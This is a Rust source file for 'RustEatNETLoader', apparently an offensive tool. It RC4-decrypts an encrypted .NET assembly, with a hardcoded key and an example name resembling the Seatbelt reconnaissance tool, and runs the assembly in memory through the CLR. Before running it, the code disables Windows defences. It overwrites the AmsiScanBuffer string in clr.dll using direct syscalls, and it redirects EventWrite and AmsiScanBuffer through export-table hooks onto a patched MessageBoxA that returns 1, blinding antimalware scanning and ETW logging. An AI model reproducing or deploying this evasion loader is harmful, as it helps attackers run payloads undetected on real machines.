#![allow(non_snake_case,non_camel_case_types, unused_imports)]

use std::ffi::CStr;
use winapi::ctypes::c_void;

use rust_syscalls::syscall;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::um::memoryapi::{VirtualQuery, ReadProcessMemory};

use winapi::um::{
    winnt::{  LONG,  HANDLE,  PVOID},
};
use clroxide::clr::Clr;
use windows::Win32::Foundation::SIZE;
use std::{env, fs, process::exit};
use sysinfo::System;
use std::{pin, process, ptr};
use std::{fs::File, io::Read};
use rc4::{Rc4, KeyInit, StreamCipher};
use windows::core::{s, PCSTR};
use base64;
use std::os::raw::{c_ulong};

extern crate winapi;
use std::ffi::{CString, OsStr};

use std::ptr::null_mut;
use winapi::shared::{
    minwindef::LPVOID,
    ntdef::LPCWSTR,
    windef::HWND,
};
use std::os::windows::ffi::OsStrExt;
use std::mem::size_of;
use winapi::shared::minwindef::ULONG;
use winapi::shared::minwindef::DWORD;
use winapi::um::{
    libloaderapi::GetModuleHandleA,
    libloaderapi::GetProcAddress,
    libloaderapi::LoadLibraryA,

    memoryapi::VirtualProtect,
    processthreadsapi::GetCurrentProcess,
    processthreadsapi::GetCurrentProcessId,
    psapi::{MODULEINFO, GetModuleInformation},
    winnt::{PAGE_GUARD,MEM_COMMIT,PAGE_EXECUTE_READWRITE,MEMORY_BASIC_INFORMATION,PAGE_READONLY, PIMAGE_DOS_HEADER, 
        PIMAGE_EXPORT_DIRECTORY, PIMAGE_NT_HEADERS,PAGE_READWRITE,PAGE_EXECUTE_READ},
    winuser::{MB_OK, MessageBoxA},
};

unsafe extern "system" fn hook_message_box_a(h_wnd: HWND, _: LPCWSTR, _: LPCWSTR, u_type: u32) -> i32 {
    println!("print hello world");
    return 1;
}
use ntapi::ntmmapi::{NtProtectVirtualMemory, NtWriteVirtualMemory};

fn is_readable(protect: DWORD, state: DWORD) -> bool {
    // Check if the protection allows reading
    if !((protect & PAGE_READONLY) == PAGE_READONLY
        || (protect & PAGE_READWRITE) == PAGE_READWRITE
        || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE
        || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)
    {
        return false;
    }

    // Check if PAGE_GUARD is set (which makes memory inaccessible)
    if (protect & PAGE_GUARD) == PAGE_GUARD {
        return false;
    }

    // Check if memory is committed
    if (state & MEM_COMMIT) != MEM_COMMIT {
        return false;
    }

    true
}

unsafe fn patchclr()->bool{

    let zero = [0u8; 15];
    let clr_handle = unsafe { LoadLibraryA("c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll\0".as_ptr() as _) };
    let amsi_scan_buffer = b"AmsiScanBuffer\0";
    if clr_handle.is_null() {
        println!("[+] Cannot get clr handle!");
        return false;
    }
    let mut base_address = clr_handle as LPVOID;
    loop {
            let mut mem_info: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
            
            if VirtualQuery(
                base_address,
                &mut mem_info,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            ) == 0
            {
                break;
            }

            let region_size = mem_info.RegionSize;

            if mem_info.Protect == PAGE_READONLY {
                if !is_readable(mem_info.Protect, mem_info.State) {
                    base_address = (base_address as usize + region_size) as LPVOID;
                    continue;
                }

                // Search for AmsiScanBuffer string in the memory region
                for j in 0..(mem_info.RegionSize - amsi_scan_buffer.len()) {
                    let current = (mem_info.BaseAddress as usize + j) as *const u8;
                    
                    let mut found = true;
                    for k in 0..amsi_scan_buffer.len() {
                        if *current.add(k) != amsi_scan_buffer[k] {
                            found = false;
                            break;
                        }
                    }

                    if found {
                        let amsi_scan_buffer_address = current as LPVOID;
                        println!("[+] Found AmsiScanBuffer address in {:p}", amsi_scan_buffer_address);

                        let mut original: ULONG = 0;
                        let mut new: DWORD = 0;
                        let mut base_addr = mem_info.BaseAddress;
                        let mut region_sz = mem_info.RegionSize;

                        // Change memory protection to read-write-execute
                        let status = syscall!(
                            "NtProtectVirtualMemory",
                            -1isize as HANDLE,
                            &mut base_addr,
                            &mut region_sz,
                            PAGE_EXECUTE_READWRITE,
                            &mut original
                        );

                        if status != 0 {
                            println!("[-] Fail to modify AmsiScanBuffer memory permission to READWRITE.");
                            return false;
                        }

                        // Write zeros to patch AmsiScanBuffer
                        let status = syscall!(
                            "NtWriteVirtualMemory",
                            -1isize as HANDLE,
                            amsi_scan_buffer_address,
                            zero.as_ptr(),
                            amsi_scan_buffer.len(),
                            ptr::null_mut::<SIZE_T>()
                        );

                        if status != 0 {
                            println!("[-] Fail to patch AmsiScanBuffer.");
                            return false;
                        }

                        // Restore original memory protection
                        let status = syscall!(
                            "NtProtectVirtualMemory",
                            -1isize as HANDLE,
                            &mut base_addr,
                            &mut region_sz,
                            original,
                            &mut new
                        );

                        if status != 0 {
                            println!("[-] Fail to modify AmsiScanBuffer memory permission to original state.");
                            return false;
                        }

                        return true;
                    }
                }
            }

            base_address = (base_address as usize + region_size) as LPVOID;
        }


    false
}

unsafe fn detour(module_name: *const i8, fun_name: &str, new_func_address: u64) -> bool {
    let module_handle = GetModuleHandleA(module_name);
    let module_address = module_handle as u64;
    let mut module_info = MODULEINFO {
        lpBaseOfDll: null_mut(),
        SizeOfImage: 0,
        EntryPoint: null_mut(),
    };
    GetModuleInformation(GetCurrentProcess(), module_handle, &mut module_info as _, size_of::<MODULEINFO>() as _);
    let p_dos_header = module_address as PIMAGE_DOS_HEADER;
    let p_nt_headers = (module_address + (*p_dos_header).e_lfanew as u64) as PIMAGE_NT_HEADERS;
    let p_image_export_directory = (module_address + (*p_nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as u64) as PIMAGE_EXPORT_DIRECTORY;

    let p_address_of_name_ordinals = (module_address + (*p_image_export_directory).AddressOfNameOrdinals as u64) as *const u16;
    let p_address_of_names = (module_address + (*p_image_export_directory).AddressOfNames as u64) as *const u32;
    let p_address_of_functions = (module_address + (*p_image_export_directory).AddressOfFunctions as u64) as *const u32;

    for i in 0..(*p_image_export_directory).NumberOfNames as isize {
        let ordinal = *p_address_of_name_ordinals.offset(i) as isize;
        let name = (module_address + *(p_address_of_names.offset(i)) as u64) as *const i8;
        let p_func_offset = p_address_of_functions.offset(ordinal);
        let func_offset = *p_func_offset as u64;
        let func_addr_u64 = (module_handle as u64) + func_offset;
        let func_addr = func_addr_u64 as usize;

        let func_name_cstr = std::ffi::CStr::from_ptr(name);

        if let Ok(func_name_str) = func_name_cstr.to_str() {
            if func_name_str == fun_name {
                println!("[+] Found {} at : 0x{:x}", fun_name, func_addr);

                if new_func_address > module_address {
                    // CHANGED: Using NtProtectVirtualMemory instead of VirtualProtect

                    let mut old_protection = 0u32;
                    VirtualProtect(module_address as _, module_info.SizeOfImage as _, PAGE_EXECUTE_READWRITE, &mut old_protection as _);

                    let mut base_address = module_address as *mut c_void;
                    let mut region_size = module_info.SizeOfImage as SIZE_T;

                    // let protect_status = NtProtectVirtualMemory(
                    //     -1isize as HANDLE,          // Current process
                    //     &mut base_address,          // Base address
                    //     &mut region_size,           // Region size
                    //     PAGE_EXECUTE_READWRITE,     // New protection
                    //     &mut old_protection,        // Old protection
                    // );
                    
                    // if !NT_SUCCESS(protect_status) {
                    //     println!("[-] NtProtectVirtualMemory failed: 0x{:x}", protect_status);
                    //     return false;
                    // }

                    // CHANGED: Using NtWriteVirtualMemory instead of direct memory write
                    let new_offset = (new_func_address - module_address) as u32;
                    let new_offset_bytes = new_offset.to_le_bytes();
                    
                    let write_status = syscall!("NtWriteVirtualMemory",
                        -1isize as HANDLE,                      // Current process
                        p_func_offset as *mut c_void,           // Target address
                        new_offset_bytes.as_ptr() as *mut c_void, // Source buffer
                        size_of::<u32>(),                       // Size (4 bytes for u32)
                        ptr::null_mut::<SIZE_T>()              // Bytes written
                    );
                    
                    if !NT_SUCCESS(write_status) {
                        println!("[-] NtWriteVirtualMemory failed: 0x{:x}", write_status);
                        // Try to restore protection before returning
                        // let mut restore_base = module_address as *mut c_void;
                        // let mut restore_size = module_info.SizeOfImage as SIZE_T;
                        // let _ = syscall!("NtProtectVirtualMemory",
                        //     -1isize as HANDLE,
                        //     &mut restore_base,
                        //     &mut restore_size,
                        //     old_protection,
                        //     &mut old_protection
                        // );
                        return false;
                    }

                    // CHANGED: Restore protection using NtProtectVirtualMemory
                    // let mut restore_base = module_address as *mut c_void;
                    // let mut restore_size = module_info.SizeOfImage as SIZE_T;
                    // let restore_status = NtProtectVirtualMemory(
                    //     -1isize as HANDLE,          // Current process
                    //     &mut restore_base,          // Base address
                    //     &mut restore_size,          // Region size
                    //     old_protection,             // Restore original protection
                    //     &mut old_protection,        // Old protection (ignored)
                    // );
                    
                    // if !NT_SUCCESS(restore_status) {
                    //     println!("[-] Warning: Failed to restore protection: 0x{:x}", restore_status);
                    // }
                    
                    println!("[+] Successfully hooked {} via EAT", fun_name);
                    return true;
                } else {
                    break;
                }
            }
        }
    }
    return false;
}

unsafe fn patchMessageboxA() -> bool{
    let currentProcess  : HANDLE = -1isize as _;
    let h_module = LoadLibraryA("USER32.dll\0".as_ptr() as _);
    if h_module.is_null() {
        println!("[-] Failed to get user32.dll handle");
        return false;
    }
    let msgbox_addr = GetProcAddress(h_module, "MessageBoxA\0".as_ptr() as _);
    let msgbox_addr_str = msgbox_addr as usize;
    if msgbox_addr.is_null() {
        println!("[-] Failed to get MessageBoxA address");
        return false;
    }
    println!("[+] msgboxa_addr : 0x{:x}", msgbox_addr_str);

    let patch_bytes: [u8; 11] = [0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3];
    let patch_size = patch_bytes.len();


    // Change memory protection to allow writing
    let mut old_protection: u32 = 0;
    let mut region_size: SIZE_T = patch_size;
    let mut base_address = msgbox_addr as *mut c_void;
    
    let status = syscall!("NtProtectVirtualMemory",
        -1isize as HANDLE,              // Current process
        &mut base_address,              // Base address
        &mut region_size,               // Region size
        PAGE_EXECUTE_READWRITE,         // New protection
        &mut old_protection            // Old protection
    );
    
    if !NT_SUCCESS(status) {
        println!("[-] NtProtectVirtualMemory failed with status: 0x{:X}", status);
        return false;
    }
    
    println!("[+] Memory protection changed. Old protection: 0x{:X}", old_protection);

    // Write the patch
    let write_status = syscall!(
        "NtWriteVirtualMemory",
        -1isize as HANDLE,              // Current process
        msgbox_addr as *mut c_void, // Target address
        patch_bytes.as_ptr() as *mut c_void,  // Source buffer
        patch_size,                     // Size
        ptr::null_mut::<SIZE_T>()               // Bytes written
    );
    if !NT_SUCCESS(write_status) {
        // Try to restore original protection
        let _ = syscall!("NtProtectVirtualMemory",
            -1isize as HANDLE,
            &mut base_address,
            &mut region_size,
            old_protection,
            &mut old_protection
        );
        println!("[-] NtWriteVirtualMemory failed with status: 0x{:X}", write_status);
        return false;
    }
    println!("[+] Success Patch MessageboxA through NtWriteVirtualMemory");

    // if VirtualProtect(msgbox_addr as _, 0x01, old_protect, &mut old_protect) == 0 {
    //     print!("[!] VirtualProtect Failed ");
    //     return false;
    // }
    let restore_status = syscall!("NtProtectVirtualMemory",
        -1isize as HANDLE,
        &mut base_address,
        &mut region_size,
        old_protection,
        &mut old_protection
    );
    if !NT_SUCCESS(restore_status) {
        println!("[-] Warning: Failed to restore original protection: 0x{:X}", restore_status);
        return false;
    } else {
        println!("[+] Original memory protection restored");
        return true;
    }

    println!("[+] Patched MessageBoxA successfully");
    return true;
}

unsafe fn EATHookAMSI() -> bool{

    // load library
    let user32 = LoadLibraryA("USER32.dll\0".as_ptr() as _);
    let amsi = LoadLibraryA("amsi.dll\0".as_ptr() as _);

    // debug code
    // let mut s = String::new();
    // std::io::stdin().read_line(&mut s).unwrap();

    // Get Function Address
    let amsiscan_addr = GetProcAddress(amsi, "AmsiScanBuffer\0".as_ptr() as _);
    let msgboxa_addr = GetProcAddress(user32, "MessageBoxA\0".as_ptr() as _);

    // debug message
    // let amsiaddr = amsi as usize;
    // let mess = amsiscan_addr as usize;
    // println!("amsibase_addr : 0x{:x}", amsiaddr);
    // println!("amsiscan_addr : 0x{:x}", mess);


    // inital EAT Hook
    detour("amsi.dll\0".as_ptr() as _, "AmsiScanBuffer", msgboxa_addr as _);

    let new_addr = GetProcAddress(amsi, "AmsiScanBuffer\0".as_ptr() as _);
    let new_addr_str = new_addr as usize;
    println!("[+] AmsiScanBuffer address after EAT Hook: 0x{:x}", new_addr_str);

    return true;
}



unsafe fn EATHookETW() -> bool {
    // load library
    let user32 = LoadLibraryA("USER32.dll\0".as_ptr() as _);
    let advapi32 = LoadLibraryA("advapi32.dll\0".as_ptr() as _);

    // Get Function Address
    let etwwrite_addr = GetProcAddress(advapi32, "EventWrite\0".as_ptr() as _);
    let msgboxa_addr = GetProcAddress(user32, "MessageBoxA\0".as_ptr() as _);
    let msgboxa_addr_str = msgboxa_addr as usize;


    // inital EAT Hook
    detour("advapi32.dll\0".as_ptr() as _, "EventWrite", msgboxa_addr as _);

    // check EAT Address
    let advapi32 = GetModuleHandleA("advapi32.dll\0".as_ptr() as _);

    let new_addr = GetProcAddress(advapi32, "EventWrite\0".as_ptr() as _);
    let new_addr_str = new_addr as usize;
    println!("[+] EventWrite address after EAT Hook: 0x{:x}", new_addr_str);
    return true;
}

fn setup_bypass() -> bool {
    unsafe{
        
        let patch_result = patchMessageboxA();
        if !patch_result {
            return false;
        }
        let amsi_result = patchclr();
        if !amsi_result {
            return false;
        }
        let etw_result = EATHookETW();
        if !etw_result {
            return false;
        }
    }

    return true;
}



fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents).expect("Failed to read file");
    contents
}

fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"DarklabHK".into());

    rc4.apply_keystream(&mut buf);

    buf
}

fn prepare_args() -> (String, Vec<String>) {
    let mut args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("[!] Usage: {} <RC4 Encrypted File> <Arguments>", args[0]);
        println!("[!] Example: {} S-e-a-t-b-e-l-t-4.enc AntiVirus", args[0]);
        exit(1)
    }

    let mut command_args: Vec<String> = vec![];

    if args.len() > 2 {
        command_args = args.split_off(2)
    }

    let path = args[1].clone();
    // let path = "D:\\rustDev\\hook-in-rust\\RustEatNETLoader\\target\\debug\\S-e-a-t-b-e-l-t-4.enc".to_string();

    println!("[+] Running {} with args: {:?}", path, command_args);

    return (path, command_args);
}

fn main() -> Result<(), String> {
    println!("[+] RustEatNETLoader by Alex Lee.");

    let mut s = String::new();
    std::io::stdin().read_line(&mut s).unwrap();
    println!("[+] Github: https://github.com/alexlee820/RustEatNETLoader");
    let (path, args) = prepare_args();
    let shellcode = decrypt_rc4(&path);
    let mut clr = Clr::new(shellcode, args)?;
    let pid = unsafe { GetCurrentProcessId() };
    println!("[+] Current process ID: {}", pid);
    let status = unsafe { setup_bypass() };
    let status = true;
    // windbg debug code
    // let mut s = String::new();
    // std::io::stdin().read_line(&mut s).unwrap();

    if status {
        println!("[+] start running CLR");
        let results = clr.run()?;
        println!("[+] Results:\n\n{}", results);
        process::exit(0);
    }
    else{
            println!("Error Occur!");
    }
        Ok(())
}